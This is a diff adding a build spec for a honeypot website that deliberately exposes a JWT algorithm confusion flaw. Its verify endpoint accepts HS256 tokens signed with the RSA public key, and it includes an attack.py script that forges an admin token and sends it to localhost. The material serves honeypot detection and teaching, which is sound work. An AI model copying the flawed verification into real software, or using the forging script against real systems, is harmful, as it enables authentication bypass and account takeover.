@@ -1,0 +1,438 @@
+# JWT Algorithm Confusion Honeypot Website (Vulnerability ID: JWT-ALG-CONF)
+
+## BUSINESS/WEBSITE STYLE
+[SPECIFY YOUR BUSINESS/WEBSITE STYLE HERE]
+Example: "Create a secure authentication portal website. Professional, enterprise-grade design with a focus on security. Color scheme: Dark theme with blue accents. Include login and token verification functionality."
+
+---
+
+## VULNERABILITY OVERVIEW
+
+**Vulnerability Name:** JWT Algorithm Confusion Attack
+**MITRE ATT&CK Techniques:**
+- T1110: Application Access Token - Brute force attempts
+- T1550: Use Alternate Authentication Material - Algorithm confusion
+
+**Vulnerability Description:**
+This honeypot exposes a JWT algorithm confusion vulnerability where the server accepts tokens signed with HS256 (symmetric) when it should only accept RS256 (asymmetric). Attackers can:
+- Forge tokens by signing with the public key as an HMAC secret
+- Gain unauthorized access by creating valid tokens
+- Bypass authentication by exploiting algorithm confusion
+
+The vulnerability occurs when the server doesn't explicitly whitelist allowed algorithms and accepts tokens signed with different algorithms than expected.
+
+---
+
+## TECHNICAL SETUP
+
+### 1. Project Initialization
+
+```bash
+# Create Next.js project
+npx create-next-app@16.0.3 honeypot-jwt-alg-confusion --typescript --tailwind --app
+
+# Install dependencies
+npm install @supabase/supabase-js@^2.84.0 jose@^6.1.2 jsonwebtoken@^9.0.2
+npm install --save-dev @types/jsonwebtoken@^9.0.10
+```
+
+### 2. Project Structure
+
+```
+honeypot-jwt-alg-confusion/
+├── app/
+│   ├── api/
+│   │   └── auth/
+│   │       ├── login/
+│   │       │   └── route.ts      # Login endpoint (RS256 signing)
+│   │       ├── verify/
+│   │       │   └── route.ts      # Vulnerable verification endpoint
+│   │       └── jwks/
+│   │           └── route.ts      # JWKS endpoint (exposes public key)
+│   ├── components/
+│   │   ├── LoginButton.tsx
+│   │   └── Navbar.tsx
+│   ├── layout.tsx
+│   ├── page.tsx
+│   └── globals.css
+├── lib/
+│   ├── honeypot-config.ts       # API key configuration
+│   ├── honeypot-utils.ts         # Logging utilities
+│   └── supabase.ts               # Supabase client setup
+└── attack.py                     # Example attack script
+```
+
+### 3. Environment Variables
+
+Create `.env.local`:
+
+```env
+SUPABASE_URL=your_supabase_project_url
+SUPABASE_SERVICE_KEY=your_service_role_key
+JWT_PRIVATE_KEY=-----BEGIN RSA PRIVATE KEY-----\n...\n-----END RSA PRIVATE KEY-----
+JWT_PUBLIC_KEY=-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----
+```
+
+### 4. Generate RSA Key Pair
+
+```bash
+# Generate private key
+openssl genrsa -out private.pem 2048
+
+# Generate public key
+openssl rsa -in private.pem -pubout -out public.pem
+
+# Convert to single-line format for .env
+cat private.pem | tr '\n' '\\n'
+cat public.pem | tr '\n' '\\n'
+```
+
+---
+
+## SUPABASE SETUP
+
+### 1. Database Schema
+
+Use the same `vulnerability_logs` table as other honeypots (see honeypot-api-key-prompt.txt).
+
+### 2. Supabase Client (`lib/supabase.ts`)
+
+```typescript
+import { createClient } from '@supabase/supabase-js';
+
+const supabaseUrl = process.env.SUPABASE_URL;
+if (!supabaseUrl) throw new Error('SUPABASE_URL was not set in the env');
+const supabaseServiceKey = process.env.SUPABASE_SERVICE_KEY;
+if (!supabaseServiceKey) throw new Error('SUPABASE_SERVICE_KEY was not set in the env');
+
+export const supabase = createClient(supabaseUrl, supabaseServiceKey);
+
+export interface VulnerabilityLog {
+  id?: string;
+  base_url: string;
+  vulnerability_type: string;
+  technique_id: string;
+  timestamp?: string;
+  attacker_id: string;
+  session_id: string;
+  success?: boolean;
+}
+
+export async function logHoneypotTrigger(result: VulnerabilityLog) {
+  try {
+    const { error } = await supabase
+      .from('vulnerability_logs')
+      .insert(result);
+
+    if (error) {
+      console.error('Failed to log to Supabase:', error);
+    }
+  } catch (err) {
+    console.error('Error logging honeypot trigger:', err);
+  }
+}
+```
+
+---
+
+## IMPLEMENTATION DETAILS
+
+### 1. Login Endpoint (`app/api/auth/login/route.ts`)
+
+```typescript
+import { NextRequest, NextResponse } from 'next/server';
+import jwt from 'jsonwebtoken';
+
+// Mock user database
+const USERS = {
+  'user@example.com': { password: 'password123', role: 'user', userId: '1' },
+  'admin@example.com': { password: 'admin123', role: 'admin', userId: '2' }
+};
+
+export async function POST(request: NextRequest) {
+  try {
+    const { email, password } = await request.json();
+
+    const user = USERS[email as keyof typeof USERS];
+    if (!user || user.password !== password) {
+      return NextResponse.json(
+        { error: 'Invalid credentials' },
+        { status: 401 }
+      );
+    }
+
+    // Sign JWT with RS256 (secure algorithm)
+    const token = jwt.sign(
+      {
+        sub: user.userId,
+        email,
+        role: user.role,
+        iat: Math.floor(Date.now() / 1000),
+        exp: Math.floor(Date.now() / 1000) + (60 * 60) // 1 hour
+      },
+      process.env.JWT_PRIVATE_KEY!.replace(/\\n/g, '\n'),
+      { algorithm: 'RS256' }
+    );
+
+    return NextResponse.json({ token });
+  } catch (error) {
+    return NextResponse.json(
+      { error: 'Login failed' },
+      { status: 500 }
+    );
+  }
+}
+```
+
+### 2. Vulnerable Verification Endpoint (`app/api/auth/verify/route.ts`)
+
+```typescript
+import { NextRequest, NextResponse } from 'next/server';
+import jwt from 'jsonwebtoken';
+import crypto from 'crypto';
+import { logHoneypotTrigger } from '@/lib/supabase';
+
+// 🔥 TOGGLE VULNERABILITY HERE 🔥
+const VULNERABLE_MODE = true; // Set to false for secure mode
+
+function getSessionId(request: Request): string {
+  const ip = request.headers.get('x-forwarded-for') ||
+             request.headers.get('x-real-ip') ||
+             'unknown';
+  const timestamp = Date.now();
+  return `${ip.split(',')[0]}_${timestamp}`;
+}
+
+async function logAttempt(
+  request: Request,
+  success?: boolean,
+  technique_id: string = 'T1550', // Default: Use Alternate Authentication Material
+) {
+  const vulnerability_type = technique_id === 'T1110'
+    ? 'brute-force'
+    : 'jwt-algorithm-confusion';
+  
+  const attacker_id = request.headers.get('x-forwarded-for')?.split(',')[0] ||
+    request.headers.get('x-real-ip') ||
+    'unknown';
+  const session_id = getSessionId(request);
+  const base_url = (new URL(request.url)).origin;
+  
+  await logHoneypotTrigger({
+    vulnerability_type,
+    base_url,
+    technique_id,
+    attacker_id,
+    session_id,
+    success,
+  });
+}
+
+export async function POST(request: NextRequest) {
+  try {
+    const { token } = await request.json();
+
+    if (!token) {
+      return NextResponse.json({ error: 'No token provided' }, { status: 400 });
+    }
+
+    // Decode header to check algorithm (without verification)
+    const decodedHeader = jwt.decode(token, { complete: true });
+    const algorithmUsed = decodedHeader?.header?.alg;
+
+    const publicKey = process.env.JWT_PUBLIC_KEY!.replace(/\\n/g, '\n');
+    let decoded;
+
+    if (VULNERABLE_MODE) {
+      // ⚠️ VULNERABLE: Accepts any algorithm
+      try {
+        if (algorithmUsed === 'HS256') {
+          // Manually verify HS256 using public key as HMAC secret
+          // This simulates the algorithm confusion vulnerability
+          const [headerB64, payloadB64, signatureB64] = token.split('.');
+
+          const message = `${headerB64}.${payloadB64}`;
+          const expectedSignature = crypto
+            .createHmac('sha256', publicKey)
+            .update(message)
+            .digest('base64url');
+
+          if (signatureB64 === expectedSignature) {
+            const payloadStr = Buffer.from(payloadB64, 'base64url').toString();
+            decoded = JSON.parse(payloadStr);
+            console.log('✅ HS256 verification succeeded! (VULNERABILITY EXPLOITED)');
+            
+            // Log successful algorithm confusion attack
+            await logAttempt(request, true, 'T1550');
+          } else {
+            throw new Error('Invalid signature');
+          }
+        } else {
+          // Try RS256 verification for other algorithms
+          decoded = jwt.verify(token, publicKey, {
+            algorithms: ['RS256']
+          });
+          console.log('✅ RS256 verification succeeded (legitimate)');
+        }
+      } catch (err) {
+        console.log('❌ Verification error:', err);
+        // Failed attempt - log as brute force
+        await logAttempt(request, false, 'T1110');
+        return NextResponse.json(
+          { error: 'Invalid token' },
+          { status: 401 }
+        );
+      }
+    } else {
+      // ✅ SECURE: Only accepts RS256
+      try {
+        decoded = jwt.verify(token, publicKey, {
+          algorithms: ['RS256'] // Whitelist only secure algorithm
+        });
+      } catch {
+        await logAttempt(request, false);
+        return NextResponse.json(
+          { error: 'Invalid token' },
+          { status: 401 }
+        );
+      }
+    }
+
+    return NextResponse.json({
+      valid: true,
+      decoded,
+    });
+
+  } catch (err) {
+    return NextResponse.json(
+      { error: 'Verification failed' },
+      { status: 500 }
+    );
+  }
+}
+```
+
+### 3. JWKS Endpoint (`app/api/auth/jwks/route.ts`)
+
+```typescript
+import { NextResponse } from 'next/server';
+import crypto from 'crypto';
+
+export async function GET() {
+  const publicKey = process.env.JWT_PUBLIC_KEY!.replace(/\\n/g, '\n');
+  
+  // Extract modulus and exponent from public key
+  const key = crypto.createPublicKey(publicKey);
+  const jwk = key.export({ format: 'jwk' });
+
+  return NextResponse.json({
+    keys: [
+      {
+        kty: 'RSA',
+        use: 'sig',
+        kid: '1',
+        alg: 'RS256',
+        n: jwk.n,
+        e: jwk.e,
+      },
+    ],
+  });
+}
+```
+
+### 4. Example Attack Script (`attack.py`)
+
+```python
+import jwt
+import requests
+import json
+
+# Get public key from JWKS endpoint
+jwks_response = requests.get('http://localhost:3002/api/auth/jwks')
+jwks = jwks_response.json()
+public_key_jwk = jwks['keys'][0]
+
+# Convert JWK to PEM format (simplified - use proper conversion in production)
+# For this example, we'll use the public key directly from env
+
+# Create malicious token with HS256 algorithm
+malicious_payload = {
+    'sub': '1',
+    'email': 'admin@example.com',
+    'role': 'admin',
+    'iat': 1234567890,
+    'exp': 9999999999
+}
+
+# Read public key from environment or file
+# In real attack, attacker would get this from JWKS endpoint
+public_key_pem = """-----BEGIN PUBLIC KEY-----
+... (from JWKS or environment)
+-----END PUBLIC KEY-----"""
+
+# Sign with HS256 using public key as secret (algorithm confusion)
+malicious_token = jwt.encode(
+    malicious_payload,
+    public_key_pem,  # Using public key as HMAC secret
+    algorithm='HS256'
+)
+
+print(f"Malicious token: {malicious_token}")
+
+# Try to verify the token
+verify_response = requests.post(
+    'http://localhost:3002/api/auth/verify',
+    json={'token': malicious_token}
+)
+
+print(f"Verification response: {verify_response.json()}")
+```
+
+---
+
+## TESTING
+
+### 1. Test Normal Login Flow
+1. Login with valid credentials → Get RS256 token
+2. Verify token → Should succeed
+
+### 2. Test Algorithm Confusion Attack
+1. Get public key from `/api/auth/jwks`
+2. Create token signed with HS256 using public key as secret
+3. Verify token → Should succeed (exploiting vulnerability)
+
+### 3. Verify Logging
+```sql
+SELECT * FROM vulnerability_logs 
+WHERE vulnerability_type IN ('jwt-algorithm-confusion', 'brute-force')
+ORDER BY timestamp DESC;
+```
+
+---
+
+## SECURITY NOTES
+
+⚠️ **This code is intentionally vulnerable for honeypot purposes.**
+- DO NOT accept multiple algorithms without explicit whitelisting
+- Always specify allowed algorithms explicitly: `algorithms: ['RS256']`
+- Never use the same key for both symmetric and asymmetric operations
+- Validate algorithm in JWT header matches expected algorithm
+- Use proper key management and rotation
+
+**Secure Implementation:**
+```typescript
+// ✅ SECURE: Explicitly whitelist algorithms
+decoded = jwt.verify(token, publicKey, {
+  algorithms: ['RS256'] // Only accept RS256
+});
+```
+
+---
+
+## DEPLOYMENT
+
+1. Set environment variables (including RSA key pair)
+2. Run database migrations in Supabase
+3. Deploy Next.js app
+4. Monitor `vulnerability_logs` table for algorithm confusion attempts
+
